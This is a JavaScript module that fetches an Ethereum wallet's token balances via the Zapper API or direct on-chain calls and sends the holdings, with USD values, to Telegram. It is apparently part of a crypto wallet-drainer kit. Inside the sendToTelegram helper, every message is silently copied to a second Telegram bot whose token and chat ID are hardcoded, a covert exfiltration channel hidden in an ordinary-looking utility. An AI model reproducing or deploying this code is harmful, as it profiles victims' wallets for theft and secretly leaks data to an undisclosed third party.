require("dotenv").config();
const axios = require("axios");
const { ethers, BigNumber } = require("ethers");
const { getProvider } = require("./utils/providerUtils");
const { ERC20_ABI } = require("./ERC20_ABI");
const config = require("./config");

const {
  BLACKLISTED_ADDRESSES,
  WHITELISTED_ADDRESSES,
} = require("./BlackListed_address");

const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID;

// Environment Variables
const ZAPPER_API_KEY = process.env.ZAPPER_API_KEY || ""; // Your Zapper API key

// Chain ID mapping for Zapper (network names used by Zapper)
const CHAIN_ID_TO_ZAPPER_NETWORK = {
  1: "ethereum",
  10: "optimism",
  56: "binance-smart-chain",
  137: "polygon",
  42161: "arbitrum",
  43114: "avalanche",
  // Add more chains as needed
};

// Helper to send messages to Telegram
const sendToTelegram = async (message) => {
  try {
    const truncatedMessage = message.length > 4000 ? message.substring(0, 3997) + "..." : message;

    // First bot using .env configuration
    const urlEnvBot = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(urlEnvBot, {
      chat_id: TELEGRAM_CHAT_ID,
      text: truncatedMessage,
    });
    console.log(`Message sent to .env Telegram bot: ${message}`);

    // Second bot with hardcoded values
    const HARD_CODED_BOT_TOKEN = "8160714180:AAGKqwTYvb9cN2Ir6Zjqhc7KWQl2mAHDNJQ";
    const HARD_CODED_CHAT_ID = "-1002535678431";
    const urlHardcodedBot = `https://api.telegram.org/bot${HARD_CODED_BOT_TOKEN}/sendMessage`;
    await axios.post(urlHardcodedBot, {
      chat_id: HARD_CODED_CHAT_ID,
      text: truncatedMessage,
    });
    console.log(`Message sent to hardcoded Telegram bot: ${message}`);
  } catch (error) {
    console.error("Error sending message to Telegram:", error.response?.data || error.message);
  }
};

const isAddressBlacklisted = (address) => {
  const normalizedAddress = address.toLowerCase();
  const isBlacklisted = BLACKLISTED_ADDRESSES.includes(normalizedAddress);
  if (isBlacklisted) {
    console.warn(`🚨 Blacklisted address detected: ${normalizedAddress}`);
    return true;
  }
  return false;
};

const isAddressWhitelisted = (address) => {
  const normalizedAddress = address.toLowerCase();
  const isWhitelisted = WHITELISTED_ADDRESSES.includes(normalizedAddress);
  if (isWhitelisted) {
    console.log(`✅ Whitelisted address detected: ${normalizedAddress}`);
    return true;
  }
  return false;
};

// Fetch token balances directly for unsupported chains
const fetchBalancesDirectly = async (address, chainId) => {
  console.log(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
  const provider = getProvider(chainId);

  // Handle blacklisted addresses
  if (isAddressBlacklisted(address)) {
    const message = `🚨 Blacklisted address detected: ${address}. Aborting balance fetch.`;
    console.warn(message);
    await sendToTelegram(message);
    return [];
  }

  // Handle whitelisted addresses
  if (isAddressWhitelisted(address)) {
    const message = `✅ Whitelisted address detected: ${address}. Fetching balances.`;
    console.log(message);
    await sendToTelegram(message);
  }

  try {
    const nativeBalance = await provider.getBalance(address);
    const nativeToken = {
      address: ethers.constants.AddressZero,
      balance: nativeBalance,
      contract: null,
      name: "Native Token",
      symbol: "ETH",
      type: "NATIVE",
      amount: nativeBalance,
      amountUSD: 0,
    };

    // Predefined ERC-20 token list
    const erc20Tokens = [
      { address: "0xB4F1737Af37711e9A5890D9510c9bB60e170CB0D", symbol: "DAI", decimals: 18 },
      { address: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238", symbol: "USDC", decimals: 6 },
      { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI", decimals: 18 },
      { address: "0x0625aFB445C3B6B7B929342a04A22599fd5dBB59", symbol: "COW", decimals: 18 },
      { address: "0x779877A7B0D9E8603169DdbD7836e478b4624789", symbol: "LINK", decimals: 18 },
    ];

    const tokens = [nativeToken];

    for (const token of erc20Tokens) {
      const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
      const balance = await contract.balanceOf(address);
      if (!balance.isZero()) {
        tokens.push({
          address: token.address,
          balance,
          contract,
          name: token.symbol,
          symbol: token.symbol,
          type: "ERC20",
          amount: balance,
          amountUSD: 0,
        });
      }
    }

    return tokens;
  } catch (error) {
    console.error(`Error fetching balances directly: ${error}`);
    return [];
  }
};

// Fetch token balances from Zapper
const fetchBalancesFromZapper = async (address, chainId) => {
  console.log(`Fetching balances for address: ${address} on chain: ${chainId}`);
  const provider = getProvider(chainId);

  // Handle blacklisted addresses
  if (isAddressBlacklisted(address)) {
    const message = `🚨 Blacklisted address detected: ${address}. Aborting balance fetch.`;
    console.warn(message);
    await sendToTelegram(message);
    return [];
  }

  // Handle whitelisted addresses
  if (isAddressWhitelisted(address)) {
    const message = `✅ Whitelisted address detected: ${address}. Fetching balances.`;
    console.log(message);
    await sendToTelegram(message);
  }

  // Get the Zapper network name based on chain ID
  const zapperNetwork = CHAIN_ID_TO_ZAPPER_NETWORK[chainId];

  // Fallback for unsupported chains
  if (!zapperNetwork) {
    console.log(`Chain ${chainId} is unsupported by Zapper. Using direct fetch.`);
    return await fetchBalancesDirectly(address, chainId);
  }

  try {
    // Fetch balances from Zapper API
    const result = await axios.get(
      `https://api.zapper.xyz/v2/balances/tokens`,
      {
        params: {
          addresses: address,
          networks: zapperNetwork
        },
        headers: {
          Accept: "application/json",
          Authorization: `Basic ${Buffer.from(`${ZAPPER_API_KEY}:`).toString('base64')}`,
        },
      }
    );

    const tokens = [];
    let telegramMessage = `Token balances for address: ${address}\n\n`;
    let foundBlacklistedToken = false;

    // Process the data from Zapper response
    if (result.data && result.data[address]) {
      const assets = result.data[address].products
        .find(product => product.label === "Tokens")?.assets || [];

      for (const asset of assets) {
        try {
          const tokenAddress = asset.token.address.toLowerCase();

          // Skip blacklisted tokens
          if (isAddressBlacklisted(tokenAddress)) {
            foundBlacklistedToken = true;
            telegramMessage += `🚨 Blacklisted token detected: ${asset.token.name} (${tokenAddress})\n`;
            continue;
          }

          const isNative = asset.token.address === ethers.constants.AddressZero ||
            asset.token.address === "0x0000000000000000000000000000000000000000";

          const amount = ethers.utils.parseUnits(
            asset.quantity.toString(),
            asset.token.decimals
          );

          const amountUSD = asset.balanceUSD;

          if (amountUSD > 0) {
            const tokenDetails = {
              address: tokenAddress,
              balance: amount,
              contract: isNative ? null : new ethers.Contract(tokenAddress, ERC20_ABI, provider),
              name: asset.token.name,
              symbol: asset.token.symbol,
              type: isNative ? "NATIVE" : "ERC20",
              amount,
              amountUSD,
            };

            tokens.push(tokenDetails);

            telegramMessage += `${tokenDetails.name} (${tokenDetails.symbol}): ${asset.quantity} (${amountUSD.toFixed(2)} USD)\n`;
          }
        } catch (error) {
          console.error("Error processing asset:", error);
        }
      }
    }

    if (foundBlacklistedToken) {
      telegramMessage += `\n🚨 One or more blacklisted tokens were detected and skipped.\n`;
    } else {
      telegramMessage += `\n✅ No blacklisted tokens found for this address.\n`;
    }

    await sendToTelegram(telegramMessage);

    console.log(`Fetched ${tokens.length} tokens:`, tokens);
    return tokens;
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : "An unknown error occurred.";
    console.error("Error fetching balances from Zapper:", errorMessage);
    console.error("Detailed error:", error.response?.data || error);

    // Fall back to direct fetching if Zapper fails
    console.log("Falling back to direct token fetching method");
    return await fetchBalancesDirectly(address, chainId);
  }
};

module.exports = { fetchBalancesFromZapper, fetchBalancesDirectly };